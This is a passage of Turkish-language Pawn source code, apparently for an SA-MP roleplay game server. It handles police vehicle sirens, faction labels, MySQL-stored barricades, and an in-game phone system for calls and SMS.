			x = -0.724999; y = 1.220499; z = 0.354999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(18646, 0, 0, 0, 0, 0, 0);
		}
		case 598:
		{
			x = -0.709999; y = 1.259999; z = 0.429999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(18646, 0, 0, 0, 0, 0, 0);
		}
		case 554:
		{
			x = -0.729999; y = 1.335; z = 0.529999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(18646, 0, 0, 0, 0, 0, 0);
		}
		case 431:
		{
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
			x = 0; y = 5.81008; z = 0.649999;
			rx = 2.01; ry = 0.000000; rz = 0.000000;
		}
	}
	AttachDynamicObjectToVehicle(Arac[am][SirenObje], am, x, y, z, rx, ry, rz);
}

stock AracaSiren2(am)
{
	new Float: x, Float: y, Float: z, Float: rx, Float: ry, Float: rz;
	switch(Arac[am][amodel])
	{
	    case 560:
	    {
			x = 0.000000; y = -0.010000; z = 0.818499;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
	    }
	    case 541:
	    {
			x = 0.000000; y = -0.115000; z = 0.619999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
		}
	    case 599:
	    {
			x = 0.000000; y = 0.044999; z = 1.149999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
	    }
	    case 596:
	    {
			x = 0.000000; y = -0.379999; z = 0.894999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
	    }
		case 597:
		{
			x = 0.000000; y = -0.379999; z = 0.894999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
		}
		case 598:
		{
			x = 0.709999; y = -0.379999; z = 0.894999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
		}
		case 554:
		{
			x = 0.709999; y = -0.379999; z = 0.894999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
		}
		case 431:
		{
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
			x = 0; y = 5.325074; z = 2.125001;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
		}
		case 528:
		{
			Arac[am][SirenObje] = CreateDynamicObject(19419, 0, 0, 0, 0, 0, 0);
			x = 0; y = 0.174999; z = 1.074999;
			rx = 0.000000; ry = 0.000000; rz = 0.000000;
		}
	}
	AttachDynamicObjectToVehicle(Arac[am][SirenObje], am, x, y, z, rx, ry, rz);
}

stock SirenUygun(modeli)
{
  switch(modeli)
  {
    case 560,541,599,596,597,598,554,431,528:
    return true;
  }
  return false;
}
/*stock LSPDKafa2(oyuncuid2, oyuncuid)
{
	DeletePlayer3DTextLabel(oyuncuid,PlayerText3D:kafalabel[oyuncuid][oyuncuid2]);
//	kafalabel2[oyuncuid][oyuncuid2] = 0;
}

stock LSPDKafa(oyuncuid2, oyuncuid)
{
 if(Karakterler[oyuncuid2][Isbasi] == 1)
	{
		if(Karakterler[oyuncuid2][Dedektif] == 0)
		{
			new Flavorrutbe[64];
			switch(Karakterler[oyuncuid2][Rutbe])
			{
    case 1: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi]);
				case 2: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi2]);
				case 3: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi3]);
				case 4: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi4]);
				case 5: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi5]);
				case 6: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi6]);
				case 7: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi7]);
				case 8: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi8]);
				case 9: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi9]);
				case 10: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi10]);
			}
			if(kafalabel2[oyuncuid][oyuncuid2] == 0)
			{
				kafalabel[oyuncuid][oyuncuid2] = CreatePlayer3DTextLabel(oyuncuid, Flavorrutbe, LSPD_RENK3, 0, 0, 0.30, Flavor_MESAFE, oyuncuid2, INVALID_VEHICLE_ID, 1);
				//SendClientMessage(oyuncuid2,-1,"fonksiyon çalýþtý1");
				kafalabel2[oyuncuid][oyuncuid2] = 1;
			}
			else
			{
			    LSPDKafa2(oyuncuid2, oyuncuid);
		        UpdatePlayer3DTextLabelText(oyuncuid, kafalabel[oyuncuid][oyuncuid2], LSPD_RENK3, Flavorrutbe);
				kafalabel[oyuncuid][oyuncuid2] = CreatePlayer3DTextLabel(oyuncuid, Flavorrutbe, LSPD_RENK3, 0, 0, 0.30, Flavor_MESAFE, oyuncuid2, INVALID_VEHICLE_ID, 1);
				//SendClientMessage(oyuncuid2,-1,"fonksiyon çalýþtý2");
			}
		}
	}
}

stock BasinKafa2(oyuncuid2, oyuncuid)
{
	DeletePlayer3DTextLabel(oyuncuid,PlayerText3D:habertext[oyuncuid][oyuncuid2]);
//	kafalabel2[oyuncuid][oyuncuid2] = 0;
}

stock BasinKafa(oyuncuid2, oyuncuid)
{
			new Flavorrutbe[64];
			switch(Karakterler[oyuncuid2][Rutbe])
			{
    case 1: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 2: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 3: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 4: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 5: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 6: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 7: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 8: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 9: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
				case 10: format(Flavorrutbe, sizeof(Flavorrutbe), "[Basýn %s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionAdi]);
			}
			if(kafalabel2[oyuncuid][oyuncuid2] == 0)
			{
				habertext[oyuncuid][oyuncuid2] = CreatePlayer3DTextLabel(oyuncuid, Flavorrutbe, 0x006A00FF, 0, 0, 0.30, Flavor_MESAFE, oyuncuid2, INVALID_VEHICLE_ID, 1);
				//SendClientMessage(oyuncuid2,-1,"fonksiyon çalýþtý1");
				habertext2[oyuncuid][oyuncuid2] = 1;
			}
			else
			{
			    BasinKafa2(oyuncuid2, oyuncuid);
		        UpdatePlayer3DTextLabelText(oyuncuid, habertext[oyuncuid][oyuncuid2], 0x006A00FF, Flavorrutbe);
				habertext[oyuncuid][oyuncuid2] = CreatePlayer3DTextLabel(oyuncuid, Flavorrutbe, 0x006A00FF, 0, 0, 0.30, Flavor_MESAFE, oyuncuid2, INVALID_VEHICLE_ID, 1);
				//SendClientMessage(oyuncuid2,-1,"fonksiyon çalýþtý2");
			}
}*/

/*stock LSMDKafa2(oyuncuid2, oyuncuid)
{
	DeletePlayer3DTextLabel(oyuncuid,PlayerText3D:lsmdtext[oyuncuid][oyuncuid2]);
//	kafalabel2[oyuncuid][oyuncuid2] = 0;
}

stock LSMDKafa(oyuncuid2, oyuncuid)
{
			new Flavorrutbe[64];
			switch(Karakterler[oyuncuid2][Rutbe])
			{
    case 1: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi]);
				case 2: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi2]);
				case 3: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi3]);
				case 4: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi4]);
				case 5: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi5]);
				case 6: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi6]);
				case 7: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi7]);
				case 8: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi8]);
				case 9: format(Flavorrutbe, sizeof(Flavorrutbe), "{FF0033}[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi9]);
				case 10: format(Flavorrutbe, sizeof(Flavorrutbe), "[%s]", Factionlar[Karakterler[oyuncuid2][Faction]][FactionRutbeAdi10]);
			}
			if(lsmdtext2[oyuncuid][oyuncuid2] == 0)
			{
				lsmdtext[oyuncuid][oyuncuid2] = CreatePlayer3DTextLabel(oyuncuid, Flavorrutbe, RENK_HASTANEKAFA, 0, 0, 0.30, Flavor_MESAFE, oyuncuid2, INVALID_VEHICLE_ID, 1);
				//SendClientMessage(oyuncuid2,-1,"fonksiyon çalýþtý1");
				lsmdtext2[oyuncuid][oyuncuid2] = 1;
			}
			else
			{
			    LSMDKafa2(oyuncuid2, oyuncuid);
		        UpdatePlayer3DTextLabelText(oyuncuid, lsmdtext[oyuncuid][oyuncuid2], RENK_HASTANEKAFA, Flavorrutbe);
				lsmdtext[oyuncuid][oyuncuid2] = CreatePlayer3DTextLabel(oyuncuid, Flavorrutbe, RENK_HASTANEKAFA, 0, 0, 0.30, Flavor_MESAFE, oyuncuid2, INVALID_VEHICLE_ID, 1);
				//SendClientMessage(oyuncuid2,-1,"fonksiyon çalýþtý2");
			}
}*/

IsPlayerInRangeOfPlayer(playerid, playerid2, Float: radius) {

	new
		Float:Floats[3];

	GetPlayerPos(playerid2, Floats[0], Floats[1], Floats[2]);
	return IsPlayerInRangeOfPoint(playerid, radius, Floats[0], Floats[1], Floats[2]);
}

stock BarikatlariYukle()
{
    new query[512],i;
	format(query, 512,
	"SELECT buniqueid,o_id,d_id,model,x,y,z,rx,ry,rz,karakterler.isim, disim FROM (SELECT barikatlar.buniqueid,barikatlar.o_id,barikatlar.d_id,barikatlar.model,barikatlar.x,barikatlar.y,barikatlar.z,barikatlar.rx,barikatlar.ry,barikatlar.rz,karakterler.isim as disim FROM `barikatlar` INNER JOIN `karakterler` ON barikatlar.d_id = karakterler.id) a INNER JOIN `karakterler` ON o_id = karakterler.id");
	new Cache:cache = mysql_query(query,true);
	for(new i;i<cache_get_row_count();i++)
	{
	   	Barikat[i][buniqueid] = cache_get_field_content_int(i,"buniqueid");
        Barikat[i][o_id] = cache_get_field_content_int(i,"o_id");
        cache_get_field_content(i,"isim",Barikat[i][OlusturanIsim]);
        Barikat[i][d_id] = cache_get_field_content_int(i,"d_id");
        cache_get_field_content(i,"disim",Barikat[i][DuzenleyenIsim]);
        Barikat[i][model] = cache_get_field_content_int(i,"model");
		Barikat[i][bx] = cache_get_field_content_float(i,"x");
		Barikat[i][by] = cache_get_field_content_float(i,"y");
		Barikat[i][bz] = cache_get_field_content_float(i,"z");
		Barikat[i][brx] = cache_get_field_content_float(i,"rx");
		Barikat[i][bry] = cache_get_field_content_float(i,"ry");
		Barikat[i][brz] = cache_get_field_content_float(i,"rz");
		Barikat[i][StreamerID] = CreateDynamicObject(modelid, x, y, z, rx, ry, rz);
		i++;
	}
	cache_delete(cache);
}

GivePlayerTelephoneNumber(playerid)
{
    new Cache:cache = mysql_query("SELECT FLOOR(RAND() * 8888888)+1000000 AS 'random_num' FROM `karakterler` WHERE 'random_num' NOT IN (SELECT `telno` FROM `karakterler`) LIMIT 1",true);
	Karakter[playerid][telno] = cache_get_row_int(0,0);
	cache_delete(cache);
	KarakterKaydet(playerid);
    if(!Karakter[playerid][telno]) return 0;
	return 1;
}

GivePlayerTelephoneNumberEx(playerid)
{
    new Cache:cache = mysql_query("SELECT FLOOR(RAND() * 8888888)+1000000 AS 'random_num' FROM `karakterler` WHERE 'random_num' NOT IN (SELECT `telno` FROM `karakterler`) LIMIT 1",true);
	Karakter[playerid][telno] = cache_get_row_int(0,0);
	cache_delete(cache);
}

ObjeKurdu(playerid)
{
	new Float: x, Float: y, Float: z;
	GetPlayerPos(playerid,x,y,z);
	SetPlayerPos(playerid,x+0.1,y,z);
}

ObjesiniGuncelle(playerid)
{
	SetDynamicObjectMaterialText(gObjesi[playerid], 0,Karakter[playerid][gYazi],MateryalBoyutu[playerid],Karakter[playerid][gFont],FontBoyutu[playerid],FontBold[playerid],Karakter[playerid][gRenk],0,0);
}

/*WatchBlackScreen(playerid)
{
	TextDrawShowForPlayer(playerid, BlackScreen);
}

DeleteBlackScreen(playerid)
{
	TextDrawHideForPlayer(playerid, BlackScreen);
}*/

ClearWeaponCookie(playerid)
{
	for(new x = 0; x < 44; x++)
	{
		PlayerAmmo[playerid][x] = 0;
		WeaponUniqueID[playerid][x] = 0;
	}
}

ShowPlayerPhone(playerid)
{
	PlayerTextDrawSetString(playerid, qwe[playerid][18], "0_yeni_mesaj~n~0_cevapsiz_cagri");
	for(new a; a < sizeof(qwe[]);a++)PlayerTextDrawShow(playerid,qwe[playerid][a]);
    for(new a; a < sizeof(rty[]);a++)PlayerTextDrawHide(playerid,rty[playerid][a]);
	SelectTextDraw(playerid, 0x022c4dFF);
	SetPVarInt(playerid, "TelElinde", 1);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
}

HidePlayerPhone(playerid)
{
	for(new a; a < sizeof(qwe[]);a++)PlayerTextDrawHide(playerid,qwe[playerid][a]);
    for(new a; a < sizeof(rty[]);a++)PlayerTextDrawHide(playerid,rty[playerid][a]);
	CancelSelectTextDraw(playerid);
	SetPVarInt(playerid, "TelElinde", 0);
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
}

AramaYap(playerid, telefonno)
{
	if(!Karakter[playerid][telno]) return 0;
    if(Karakter[playerid][telno] == telefonno) return 0;
    if(telefonno == 444)
    {
        ShowPlayerDialog(playerid, 507, DIALOG_STYLE_INPUT, "Taksi Duraðý", "Lütfen konumunuzu giriniz:", "Tamam", "Vazgeç");
        return 1;
    }
    if(telefonno == 911)
    {
 		ShowPlayerDialog(playerid, 508, DIALOG_STYLE_LIST, "Ulaþmak istediðiniz acil servisi seçiniz.", "Polis\nHastane-Ýtfaiye", "Seçim", "Vazgeç");
        return 1;
    }
    foreach(new i : Player)
    {
        if(!IsPlayerConnected(i))continue;
        else if(Karakter[i][telno] == telefonno)
        {
            if(GetPVarInt(playerid, "NumaraGizle") == 1 && Karakter[i][gengelle] == 1) return Hata(playerid, "Kiþinin telefonu gizli numaralara kapalý.");
            if(Arama[i][2] != 0 || Arama[i][1] != 0) return Hata(playerid, "[TELEFON] Aradýðýnýz kiþi þu anda baþka biriyle görüþüyor.");
    		if(Karakter[i][teldurum] == 0) { Hata(playerid, "Aramak istediðiniz kiþinin þu anda telefonu kapalý."); return 1; }
	        PlayerPlaySound(playerid, 3600, 0, 0, 0);
	        Arama[playerid][0] = telefonno;
	        Araniyor(playerid, telefonno);
	        Arama[i][1] = Karakter[playerid][telno];
			SendMobileCallLog(i, Karakter[playerid][telno], playerid);
			AnimasyonYapiyor[playerid] = true;
			AnimasyonYapiyor[i] = true;
			SetPlayerAttachedObject(playerid,INDEX_TELEFON,18865,6,0.096000,0.009000,-0.008000,75.399963,179.899902,0.000000,1.000000,1.000000,1.000000);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
			AramaEkrani(playerid);
			return 1;
        }
    }
    return Hata(playerid, "Aramak istediðiniz kiþinin þu anda telefonu kapalý.");
}

TelefonMesajGonder(playerid, telefonno, result[])
{
	new RehberText[4096],searchtext[12],pos[2],oyuncuismi[25],str[144], id=-1;
	foreach(new i : Player) { if(Karakter[i][telno] == telefonno) { id = i; break; } }
	printf("%d",id);
	if(id == -1) return Hata(playerid, "SMS göndermek istediðiniz kiþinin þu anda telefonu kapalý.");
	if(Karakter[id][teldurum] == 0) return Hata(playerid, "SMS göndermek istediðiniz kiþinin þu anda telefonu kapalý.");
	GetPVarString(id, "Player_Tel_Rehber", RehberText, 4096);
	format(searchtext, 12, "|%d|",Karakter[playerid][telno]);
	if(-1 != (pos[0]=strfind(RehberText, searchtext)))
	{
	    pos[1] = pos[0]-1;
		while(pos[1] && RehberText[pos[1]] != '|')pos[1]--;
		if(pos[1]!= 0) pos[1]++;
	    strmid(oyuncuismi, RehberText, pos[1], pos[0]);
		format(str, 144, "[SMS] {FFFFFF}%s: %s",oyuncuismi,result);
		SendClientMessage(id, COLOR_ORANGE ,str);
		PlayerTextDrawSetString(id, qwe[playerid][18], "1_yeni_mesaj~n~0_cevapsiz_cagri");
	}
	else
	{
	    if(GetPVarInt(playerid,"NumaraGizle") == 1) format(str, 144, "[SMS] {FFFFFF}00000: %s", result);
	    else format(str, 144, "[SMS] {FFFFFF}%d: %s",Karakter[playerid][telno], result);
		SendClientMessage(id, COLOR_ORANGE ,str);
		PlayerTextDrawSetString(id, qwe[playerid][18], "1_yeni_mesaj~n~0_cevapsiz_cagri");
	}
	if(strcmp(RehberIsim(playerid, telefonno), "oyuncuismiyok", true) != 0)
	{
		format(str, 144, "[SMS] {FFFFFF}%s: %s",RehberIsim(playerid, telefonno),result);
		SendClientMessage(playerid, COLOR_YELLOW ,str);
		PlayerTextDrawSetString(playerid, qwe[playerid][18], "Mesaj_Gonderildi~n~0_cevapsiz_cagri");
	}
	else
	{
	    if(GetPVarInt(playerid,"NumaraGizle") == 1) format(str, 144, "[SMS] {FFFFFF}00000: %s", result);
	    else format(str, 144, "[SMS] {FFFFFF}%d: %s",telefonno, result);
		SendClientMessage(playerid, COLOR_YELLOW ,str);
		PlayerTextDrawSetString(playerid, qwe[playerid][18], "Mesaj_Gonderildi~n~0_cevapsiz_cagri");
	}
	return 1;
}

Araniyor(playerid, telefonno)
{
	new RehberText[4096],searchtext[12],pos[2],oyuncuismi[25],str[144];
	GetPVarString(playerid, "Player_Tel_Rehber", RehberText, 4096);
	format(searchtext, 12, "|%d|",telefonno);
	PlayerTextDrawSetString(playerid, rty[playerid][33], "ARANIYOR");
	if(-1 != (pos[0]=strfind(RehberText, searchtext)))
	{
	    pos[1] = pos[0]-1;
		while(pos[1] && RehberText[pos[1]] != '|')pos[1]--;
		if(pos[1]!= 0) pos[1]++;
	    strmid(oyuncuismi, RehberText, pos[1], pos[0]);
		format(str, 144, "Arýyorsunuz. Aradýðýnýz {AA0000}%s{FFFFFF}(%d)",oyuncuismi,telefonno);
		SendClientMessage(playerid, -1 ,str);
		format(str, sizeof(str), "%s~n~%d", oyuncuismi, telefonno);
		PlayerTextDrawSetString(playerid, rty[playerid][34], str);
        AramaEkrani(playerid);

	} else {
	    format(str, 144, "Arýyorsunuz. Aradýðýnýz {AAAAAA}Tanýnmýyor{FFFFFF}(%d)",telefonno);
		SendClientMessage(playerid, -1 ,str);
		format(str, sizeof(str), "Bilinmeyen_Numara~n~%d", telefonno);
		PlayerTextDrawSetString(playerid, rty[playerid][34], str);
        AramaEkrani(playerid);
	}
	if(!GetPVarInt(playerid, "TelElinde")) { ShowPlayerPhone(playerid); OnPlayerCommandPerformed(playerid,"/ame telefonunu eline alýr.",0); }
}

SendMobileCallLog(playerid, telefonno, giveplayerid)
{
	new RehberText[4096],searchtext[12],pos[2],oyuncuismi[25],str[144];
	GetPVarString(playerid, "Player_Tel_Rehber", RehberText, 4096);
	format(searchtext, 12, "|%d|",telefonno);
	PlayerTextDrawSetString(playerid, rty[playerid][33], "ARIYOR");
	if(-1 != (pos[0]=strfind(RehberText, searchtext)))
	{
	    pos[1] = pos[0]-1;
		while(pos[1] && RehberText[pos[1]] != '|')pos[1]--;
		if(pos[1]!= 0) pos[1]++;
	    strmid(oyuncuismi, RehberText, pos[1], pos[0]);
	    if(GetPVarInt(giveplayerid,"NumaraGizle") == 1) format(str, 144, "Telefonunuz çalýyor. Arayan {AA0000}Tanýnmýyor{FFFFFF}(GizliNumara)");
	    else format(str, 144, "Telefonunuz çalýyor. Arayan {AA0000}%s{FFFFFF}(%d)",oyuncuismi,telefonno);
		SendClientMessage(playerid, -1 ,str);
		if(GetPVarInt(giveplayerid,"NumaraGizle") == 1) format(str, sizeof(str), "Gizli_Numara~n~00000");
		else format(str, sizeof(str), "%s~n~%d", oyuncuismi, telefonno);
		PlayerTextDrawSetString(playerid, rty[playerid][34], str);
        AramaEkrani(playerid, 1);
        PlayerPlaySound(playerid, 20600, 0,0,0);
	}
	else
	{
	    if(GetPVarInt(giveplayerid,"NumaraGizle") == 1) format(str, 144, "Telefonunuz çalýyor. Arayan {AAAAAA}Tanýnmýyor{FFFFFF}(GizliNumara)");
	    else format(str, 144, "Telefonunuz çalýyor. Arayan {AAAAAA}Tanýnmýyor{FFFFFF}(%d)",telefonno);
		SendClientMessage(playerid, -1 ,str);
		if(GetPVarInt(giveplayerid,"NumaraGizle") == 1) format(str, sizeof(str), "Gizli_Numara~n~00000");
		else format(str, sizeof(str), "Bilinmeyen_Numara~n~%d", telefonno);
		PlayerTextDrawSetString(playerid, rty[playerid][34], str);
        AramaEkrani(playerid, 1);
        PlayerPlaySound(playerid, 20600,0,0,0);
	}
	OnPlayerCommandPerformed(playerid,"/ame telefonu çalmaktadýr.",0);
}

TelefonYaziGonder(playerid, telefonno, result[])
{
	new RehberText[4096],searchtext[12],pos[2],oyuncuismi[25],str[144], id;
	for(new i; i < MAX_PLAYERS; i++) { if(Karakter[i][telno] == telefonno) { id = i; break; } }
	GetPVarString(id, "Player_Tel_Rehber", RehberText, 4096);
	format(searchtext, 12, "|%d|",Karakter[playerid][telno]);
	new _ctext[2];
	switch(Karakter[playerid][cinsiyet])
	{
	    case 1: _ctext="E";
	    case 2: _ctext="K";
	}
	if(-1 != (pos[0]=strfind(RehberText, searchtext)))
	{
	    pos[1] = pos[0]-1;
		while(pos[1] && RehberText[pos[1]] != '|')pos[1]--;
		if(pos[1]!= 0) pos[1]++;
	    strmid(oyuncuismi, RehberText, pos[1], pos[0]);
		format(str, 144, "[TELEFON][%s] {FFFFFF}%s: %s",_ctext,oyuncuismi,result);
	 	SendClientMessage(id, COLOR_ORANGE ,str);

	}else
	{
	    if(GetPVarInt(playerid,"NumaraGizle") == 1) format(str, 144, "[TELEFON][%s] {FFFFFF}00000: %s",_ctext, result);
	    else format(str, 144, "[TELEFON][%s] {FFFFFF}%d: %s",_ctext,Karakter[playerid][telno], result);
		SendClientMessage(id, COLOR_ORANGE ,str);
	}

}

stock GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, &Float:z, Float:distance)
{
	// Created by Y_Less

	new Float:a;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);

	if (GetPlayerVehicleID(playerid)) {
	    GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	}

	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees));
}

stock GetXYInFrontOfPlayerEx(playerid, &Float:x, &Float:y, Float:distance)
{
	new
			Float:angle;
	GetPlayerPos(playerid, x, y, angle);
	GetPlayerFacingAngle(playerid, angle);
	if(GetPlayerVehicleID(playerid))
		GetVehicleZAngle(GetPlayerVehicleID(playerid), angle);
	x += (distance * floatsin(-angle, degrees));
	y += (distance * floatcos(-angle, degrees));
}

stock GetXYInFrontOfPos(Float:_x, Float:_y, Float:angle, &Float:x, &Float:y, Float:distance)
{
	x = _x + (distance * floatsin(-angle, degrees));
	y = _y + (distance * floatcos(-angle, degrees));
}

BarikatSil(barikatid)
{
	if(!Barikat[barikatid][buniqueid])return 0;
	DestroyDynamicObject(Barikat[barikatid][StreamerID]);
	new query[256];
	format(query, 256, "DELETE FROM `barikatlar` WHERE `buniqueid` = '%d'",Barikat[barikatid][buniqueid]);
    mysql_tquery(1,query);
    Barikat[barikatid][buniqueid] = 0;
    Barikat[barikatid][o_id] = -1;
    format(Barikat[barikatid][OlusturanIsim], 25, "Yok");
    Barikat[barikatid][d_id] = -1;
    format(Barikat[barikatid][DuzenleyenIsim], 25, "Yok");
    Barikat[barikatid][model] = -1;
	Barikat[barikatid][bx] = 0.0;
	Barikat[barikatid][by] = 0.0;
	Barikat[barikatid][bz] = 0.0;
	Barikat[barikatid][brx] = 0.0;
	Barikat[barikatid][bry] = 0.0;
	Barikat[barikatid][brz] = 0.0;
    return 1;
}

BarikatEkle(playerid, modelid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new query[512],uniqueid,myObject;
	format(query, 512, "INSERT INTO `barikatlar` (`o_id`, `d_id`, `model`, `x`, `y`, `z`, `rx`, `ry`, `rz`) VALUES ('%d', '%d', '%d', '%f', '%f', '%f', '%f', '%f', '%f')",Karakter[playerid][sqlid],Karakter[playerid][sqlid],modelid,x,y,z,rx,ry,rz);
	new Cache:cache = mysql_query(query,true);
	new pName[25];
	GetPlayerName(playerid, pName, 25);
	for(new i;i < MAX_BARIKAT;i++)
	{
	    if(Barikat[i][buniqueid])
	    {
	        continue;
	    }
		else
	    {
	        Barikat[i][buniqueid] = cache_insert_id();
	        Barikat[i][o_id] = Karakter[playerid][sqlid];
	        format(Barikat[i][OlusturanIsim], 25, pName);
	        Barikat[i][d_id] = Karakter[playerid][sqlid];
	        format(Barikat[i][DuzenleyenIsim], 25, pName);
			Barikat[i][model] = modelid;
			Barikat[i][bx] = x;
			Barikat[i][by] = y;
			Barikat[i][bz] = z;
			Barikat[i][brx] = rx;
			Barikat[i][bry] = ry;
			Barikat[i][brz] = rz;
			Barikat[i][StreamerID] = CreateDynamicObject(modelid, x, y, z, rx, ry, rz);
			myObject = Barikat[i][StreamerID];
	        break;
	    }
	}
	cache_delete(cache);
	SetPVarInt(playerid, "DuzenleBarikat", uniqueid);
	SetPVarInt(playerid, "BarikatDuzenliyorum", 1);
	EditDynamicObject(playerid, myObject);
	return uniqueid;
}

stock GetPlayerZone(playerid, zone[], len)
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
 	for(new i = 0; i != sizeof(gSAZones); i++ )
 	{
		if(x >= gSAZones[i][HARITA_POS][0] && x <= gSAZones[i][HARITA_POS][3] && y >= gSAZones[i][HARITA_POS][1] && y <= gSAZones[i][HARITA_POS][4])
		{
		    return format(zone, len, gSAZones[i][HARITA_ISIM], 0);
		}
	}
	return 0;
}

Isyerlerim(i)
{
	new isysaydir = 0;
	foreach(new q : Business)
	{
		if(Isyeri[q][isahip] == Karakter[i][sqlid] || Isyeri[q][ortak] == Karakter[i][sqlid] || Isyeri[q][kiralayan] == Karakter[i][sqlid]) isysaydir++;
	}
	return isysaydir;
}

stock SQLFromName(sssqlid)
{
	new Query[1024], sonuc[50];
	sonuc = "Sahipsiz";
	if(sssqlid != -1)
	{
		format(Query, sizeof(Query), "SELECT `isim` FROM `karakterler` WHERE `id` = '%d'",sssqlid);
		new Cache:cache = mysql_query(Query,true);
		if(cache_num_rows()) {
			cache_get_row(0, 0, sonuc);
			if(Buysa("NULL",sonuc)) sonuc = "Sahipsiz";
			strreplace(sonuc, "_", " ");
		}
		cache_delete(cache);
	}
	return sonuc;
}

stock RandomPlaka()
{
	new p1[26][] = {
	{"A"},
	{"B"},
	{"C"},
	{"D"},
	{"E"},
	{"F"},
	{"G"},
	{"H"},
	{"I"},
	{"J"},
	{"K"},
	{"L"},
	{"M"},
	{"N"},
